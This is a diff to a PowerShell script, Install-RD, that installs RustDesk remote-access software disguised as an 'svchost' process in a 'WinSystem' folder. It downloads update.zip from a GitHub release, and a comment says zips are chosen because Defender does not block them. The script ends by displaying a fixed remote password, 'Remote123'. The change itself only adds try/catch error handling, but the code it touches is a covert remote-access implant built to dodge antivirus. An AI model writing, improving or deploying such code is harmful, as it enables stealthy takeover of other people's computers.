@@ -6,26 +6,27 @@ function Install-RD {
     $cfgDir = "$env:APPDATA\RustDesk\config"
     $zipUrl = 'https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip'
 
-    # 1. Kill ALL old instances first - so no file locks
-    Get-Process svchost -EA SilentlyContinue |
-        Where-Object { $_.Path -like "*WinSystem*" } |
-        Stop-Process -Force -EA SilentlyContinue
-    Get-Process -Name "svchost" -EA SilentlyContinue |
-        Where-Object { $_.Path -eq $EXE } |
-        Stop-Process -Force -EA SilentlyContinue
-    Start-Sleep 2
+    try {
+        # 1. Kill ALL old instances first - so no file locks
+        Get-Process svchost -EA SilentlyContinue |
+            Where-Object { $_.Path -like "*WinSystem*" } |
+            Stop-Process -Force -EA SilentlyContinue
+        Get-Process -Name "svchost" -EA SilentlyContinue |
+            Where-Object { $_.Path -eq $EXE } |
+            Stop-Process -Force -EA SilentlyContinue
+        Start-Sleep 2
 
-    # 2. Clean old folder completely
-    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
-    Start-Sleep 1
-    New-Item -ItemType Directory $DEST   -Force | Out-Null
-    New-Item -ItemType Directory $cfgDir -Force | Out-Null
+        # 2. Clean old folder completely
+        Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
+        Start-Sleep 1
+        New-Item -ItemType Directory $DEST   -Force | Out-Null
+        New-Item -ItemType Directory $cfgDir -Force | Out-Null
 
-    # 3. Download zip (Defender does not block zips)
-    Write-Host "Installing..." -ForegroundColor Cyan
-    $zipPath = "$env:TEMP\update_rd.zip"
-    Remove-Item $zipPath -Force -EA SilentlyContinue
-    (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipPath)
+        # 3. Download zip (Defender does not block zips)
+        Write-Host "Installing..." -ForegroundColor Cyan
+        $zipPath = "$env:TEMP\update_rd.zip"
+        Remove-Item $zipPath -Force -EA SilentlyContinue
+        (New-Object System.Net.WebClient).DownloadFile($zipUrl, $zipPath)
 
     if (!(Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 1MB) {
         Write-Host "Download failed!" -ForegroundColor Red; return
@@ -135,5 +136,8 @@ if (Test-Path `$del) { & `$del }
     Write-Host "  Password : Remote123"          -ForegroundColor Cyan
     Write-Host "  ============================" -ForegroundColor Green
     Write-Host ""
+    } catch {
+        Write-Host "ERROR: $_" -ForegroundColor Red
+    }
 }
 Install-RD
